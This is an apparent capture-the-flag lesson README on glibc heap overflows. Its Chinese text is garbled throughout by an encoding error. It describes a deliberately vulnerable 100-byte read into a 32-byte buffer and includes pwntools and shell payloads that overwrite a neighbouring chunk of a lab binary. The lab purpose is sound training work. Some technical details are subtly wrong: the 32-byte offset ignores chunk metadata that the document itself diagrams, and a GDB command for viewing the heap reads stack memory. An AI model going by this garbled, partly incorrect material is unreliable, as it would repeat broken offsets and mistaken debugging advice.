# Level 1: å †æº¢å‡ºåŸºç¡€ (Heap Overflow Basics)

**éš¾åº¦**: â­ (åˆå­¦è€…)
**é¢„è®¡æ—¶é—´**: 2å°æ—¶
**å­¦ä¹ ç›®æ ‡**:
- ç†è§£å † chunk ç»“æ„
- æŒæ¡å †ç¼“å†²åŒºæº¢å‡º
- åˆ©ç”¨æº¢å‡ºæ§åˆ¶ç›¸é‚» chunk çš„æ•°æ®

## ğŸ¯ æŒ‘æˆ˜ç›®æ ‡

é€šè¿‡å †æº¢å‡ºæ¼æ´ï¼Œæ§åˆ¶ `chunk2` çš„å†…å®¹ä¸º `"pwned!"`ï¼Œä»è€Œè§¦å‘èƒœåˆ©å‡½æ•°è·å– flagã€‚

## ğŸ“‹ æŒ‘æˆ˜æè¿°

ç¨‹åºåˆ†é…äº†ä¸¤ä¸ªå †å—ï¼š
- `chunk1`: 32 å­—èŠ‚
- `chunk2`: 32 å­—èŠ‚

æ¼æ´åœ¨äº `read(0, chunk1, 100)` - è¯»å– 100 å­—èŠ‚åˆ° 32 å­—èŠ‚çš„ç¼“å†²åŒºä¸­ï¼

ä½ çš„ä»»åŠ¡æ˜¯ï¼š
1. ç†è§£å †å¸ƒå±€
2. åˆ©ç”¨æº¢å‡ºè¦†ç›– `chunk2` çš„å†…å®¹
3. ä½¿ `chunk2` åŒ…å«å­—ç¬¦ä¸² `"pwned!"`

## ğŸš€ å¿«é€Ÿå¼€å§‹

### 1. ç¼–è¯‘ç¨‹åº

```bash
cd level01_overflow/challenge
make
make flag  # åˆ›å»º flag æ–‡ä»¶
```

### 2. è¿è¡Œç¨‹åº

```bash
./vuln
```

ä½ ä¼šçœ‹åˆ°ï¼š
```
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
   Level 1: Heap Overflow Challenge
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

[+] Allocated chunk1 at: 0x5555555592a0 (size: 32)
[+] Allocated chunk2 at: 0x5555555592c0 (size: 32)

Objective: Overflow chunk1 to control chunk2's content!
Target: Make chunk2 contain the string 'pwned!'

Enter data for chunk1 (max 100 bytes):
```

### 3. æç¤º

è¾“å…¥éœ€è¦æ»¡è¶³ï¼š
1. å¡«æ»¡ chunk1 (32 å­—èŠ‚)
2. ç»§ç»­å†™å…¥ï¼Œè¦†ç›– chunk2 çš„å†…å®¹ä¸º `"pwned!"`

## ğŸ’¡ è§£é¢˜æ€è·¯

### å †å¸ƒå±€

```
+------------------+  <-- chunk1
| chunk1 data (32) |
+------------------+
| chunk metadata   |
+------------------+  <-- chunk2
| chunk2 data (32) |  <-- æˆ‘ä»¬è¦æ§åˆ¶è¿™é‡Œ
| ...              |
+------------------+
```

### æº¢å‡ºæ–¹æ³•

1. **å¡«å…… chunk1**: å‘é€ 32 å­—èŠ‚ä»»æ„æ•°æ®
2. **è¦†ç›– chunk2**: ç»§ç»­å‘é€ `"pwned!"`

### Python è§£æ³•

```python
from pwn import *

# å¡«å…… chunk1 (32 å­—èŠ‚) + è¦†ç›– chunk2 ä¸º "pwned!"
payload = b"A" * 32 + b"pwned!"

# å‘é€ payload
p = process('./vuln')
p.sendline(payload)
p.interactive()
```

### å‘½ä»¤è¡Œè§£æ³•

```bash
python3 -c "print('A'*32 + 'pwned!')" | ./vuln
```

## ğŸ“š æŠ€æœ¯åŸç†

### å † Chunk ç»“æ„

æ¯ä¸ªå †å—åŒ…å«å…ƒæ•°æ®å’Œç”¨æˆ·æ•°æ®ï¼š

```
+------------------+ <- chunk æŒ‡é’ˆ
| prev_size (8)    |  <- å‰ä¸€ä¸ªå—çš„å¤§å°ï¼ˆå¦‚æœå‰ä¸€å—ç©ºé—²ï¼‰
+------------------+
| size (8)         |  <- å½“å‰å—å¤§å°ï¼ˆåŒ…å«å¤´éƒ¨ï¼‰
+------------------+
| fd (8)           |  <- forward æŒ‡é’ˆï¼ˆä»…ç©ºé—²æ—¶ï¼‰
+------------------+
| bk (8)           |  <- backward æŒ‡é’ˆï¼ˆä»…ç©ºé—²æ—¶ï¼‰
+------------------+
| user data        |  <- ç”¨æˆ·æ•°æ®åŒºåŸŸ
| ...              |
+------------------+
```

**å…³é”®ç‚¹**ï¼š
- ç”¨æˆ·æ•°æ®ä» `chunk + 0x10` å¼€å§‹
- `size` å­—æ®µçš„æœ€ä½ 3 ä½æ˜¯æ ‡å¿—ä½
- å®é™…å¤§å° = `size & ~0x7`

### å †æº¢å‡ºåŸç†

```c
char *chunk1 = malloc(32);  // åˆ†é… 32 å­—èŠ‚
char *chunk2 = malloc(32);  // å†åˆ†é… 32 å­—èŠ‚

// æ¼æ´ï¼šè¯»å– 100 å­—èŠ‚åˆ° chunk1
read(0, chunk1, 100);  // è¶…è¿‡ 32 å­—èŠ‚ï¼
```

å½“å†™å…¥è¶…è¿‡ 32 å­—èŠ‚æ—¶ï¼š
```
chunk1: [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA]  <- 32 å­—èŠ‚
         [BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB]  <- ç»§ç»­å†™å…¥ï¼Œæº¢å‡ºåˆ° chunk2!
chunk2: [pwned!]                            <- è¢«è¦†ç›–
```

### ä¸ºä»€ä¹ˆå †æ˜¯è¿ç»­çš„ï¼Ÿ

åœ¨ glibc malloc ä¸­ï¼š
- å°å—åˆ†é…ï¼ˆ< 128KBï¼‰é€šå¸¸ä»å †ï¼ˆheapï¼‰åˆ†é…
- å †é€šè¿‡ `brk()` ç³»ç»Ÿè°ƒç”¨æ‰©å±•
- ç›¸è¿‘å¤§å°çš„åˆ†é…é€šå¸¸åœ¨å†…å­˜ä¸­ç›¸é‚»

**æ³¨æ„**: è¿™ä¸æ˜¯ç»å¯¹ä¿è¯ï¼Œä½†åœ¨ç®€å•ç¨‹åºä¸­é€šå¸¸æˆç«‹ã€‚

## ğŸ” è°ƒè¯•æŠ€å·§

### ä½¿ç”¨ GDB

```bash
gdb ./vuln
```

åœ¨ GDB ä¸­ï¼š
```
(gdb) break main
(gdb) run

# åœ¨ malloc ååœæ­¢
(gdb) heap
# æˆ–
(gdb) x/20gx $rsp-0x1000  # æŸ¥çœ‹å †å†…å­˜
```

### ä½¿ç”¨ Pwndbg

```bash
gdb ./vuln
```

```
(gdb) break malloc
(gdb) continue

# æ¯æ¬¡åˆ†é…åæŸ¥çœ‹å †
(gdb) heap
(gdb) fastbins
```

### è§‚å¯Ÿæº¢å‡º

```c
// åœ¨ vuln.c ä¸­æ·»åŠ è°ƒè¯•è¾“å‡º
printf("chunk1: %p\n", chunk1);
printf("chunk2: %p\n", chunk2);
printf("Distance: %ld bytes\n", chunk2 - chunk1);
```

## ğŸ“ è¿›é˜¶æŒ‘æˆ˜

å®ŒæˆåŸºç¡€æŒ‘æˆ˜åï¼Œå°è¯•ï¼š

1. **ä¸åŒå¤§å°çš„å—**:
   ```c
   chunk1 = malloc(16);
   chunk2 = malloc(16);
   // è·ç¦»è¿˜æ˜¯ 0x20 å—ï¼Ÿ
   ```

2. **å¤šä¸ªå—**:
   ```c
   chunk1 = malloc(32);
   chunk2 = malloc(32);
   chunk3 = malloc(32);
   // èƒ½æ§åˆ¶ chunk3 å—ï¼Ÿ
   ```

3. **å¸¦ ASLR**:
   ```bash
   echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
   # æº¢å‡ºè¿˜å·¥ä½œå—ï¼Ÿ
   ```

## âš ï¸ å¸¸è§é”™è¯¯

### é”™è¯¯ 1: åç§»é‡è®¡ç®—é”™è¯¯

```python
# âŒ é”™è¯¯
payload = b"A" * 31 + b"pwned!"  # å°‘äº† 1 å­—èŠ‚

# âœ… æ­£ç¡®
payload = b"A" * 32 + b"pwned!"  # åˆšå¥½ 32 å­—èŠ‚
```

### é”™è¯¯ 2: å¿˜è®° null å­—èŠ‚

```c
// chunk2 éœ€è¦ "pwned!\0" æ‰èƒ½åŒ¹é…
if (strcmp(chunk2, "pwned!") == 0)
```

ä½† `read()` ä¸ä¼šè‡ªåŠ¨æ·»åŠ  null ç»ˆæ­¢ç¬¦ï¼è§£å†³æ–¹æ¡ˆï¼š
```python
payload = b"A" * 32 + b"pwned!\n"  # \n ä¹Ÿå¯ä»¥
```

### é”™è¯¯ 3: å¤§å°å•ä½æ··æ·†

```c
malloc(32)  // 32 å­—èŠ‚ï¼Œä¸æ˜¯ 32 ä½ï¼
```

## ğŸ“– é˜…è¯»ææ–™

- [Level 1 ç†è®ºæ–‡æ¡£](docs/theory.md) - æ·±å…¥ç†è§£å †ç»“æ„
- [Level 1 åˆ©ç”¨æŒ‡å—](docs/walkthrough.md) - å®Œæ•´çš„è§£é¢˜æ­¥éª¤
- [Level 1 æç¤º](docs/hints.md) - å¡å…³æ—¶çš„æç¤º

## ğŸ¯ å®Œæˆæ£€æŸ¥

å®Œæˆåï¼Œä½ åº”è¯¥ï¼š
- [ ] æˆåŠŸè·å– flag
- [ ] ç†è§£å † chunk çš„ç»“æ„
- [ ] èƒ½å¤Ÿè®¡ç®— chunk ä¹‹é—´çš„åç§»
- [ ] èƒ½ç‹¬ç«‹ç¼–å†™å †æº¢å‡ºåˆ©ç”¨è„šæœ¬

## ä¸‹ä¸€æ­¥

å®Œæˆ Level 1 åï¼Œç»§ç»­ **[Level 2: Use-After-Free](../level02_uaf/)**ï¼

åœ¨ä¸‹ä¸€å…³ï¼Œä½ å°†å­¦ä¹ ï¼š
- UAF æ¼æ´åŸç†
- å †é‡ç”¨æœºåˆ¶
- Dangling æŒ‡é’ˆåˆ©ç”¨

---

**ç¥ä½ æŒ‘æˆ˜æˆåŠŸï¼** ğŸ’ª
